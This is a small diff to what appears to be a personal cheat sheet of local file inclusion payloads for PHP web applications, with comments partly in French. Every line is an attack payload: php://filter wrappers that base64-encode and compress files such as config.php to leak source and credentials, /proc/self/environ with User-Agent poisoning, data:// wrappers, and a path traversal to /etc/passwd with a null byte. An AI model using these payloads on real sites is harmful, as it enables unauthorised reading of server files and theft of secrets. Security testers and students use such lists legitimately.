@@ -6,10 +6,13 @@
 /proc/self/environ + User-Agent (no need to url-encode)
 
 # use filter to read a .php file (prevent it to be interpreted)
-index.php?page=php://filter/read=convert.base64-encode/resource=/path/to/config.php
+index.php?page=php://filter/convert.base64-encode/resource=/path/to/config.php
 
 tester avec data://
 view-source:data://text/plain;base64,Ym9uam91cgo=
+
+# use compression
+php://filter/zlib.deflate/convert.base64-encode/resource=bigfile.txt
 
 # does a folder exist
 index.php?page=../../../../../../var/www/dossierexistant/../../../../../etc/passwd%00
